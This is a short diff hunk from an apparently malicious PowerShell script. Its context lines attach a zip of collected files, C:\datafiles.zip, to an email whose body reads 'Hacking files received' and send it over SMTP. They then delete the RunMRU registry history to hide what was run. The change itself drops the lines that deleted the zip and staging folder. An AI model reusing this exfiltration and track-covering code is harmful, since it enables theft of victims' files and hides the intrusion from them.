@@ -16,6 +16,5 @@ $ReportEmail.Body = "Hacking files received....!!!!!"
 $ReportEmail.Attachments.Add("C:\datafiles.zip")
 $SMTPInfo.Send($ReportEmail)
 REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
-Remove-Item "C:\datafiles.zip"
-Remove-Item "C:\datafiles"
+
 exit
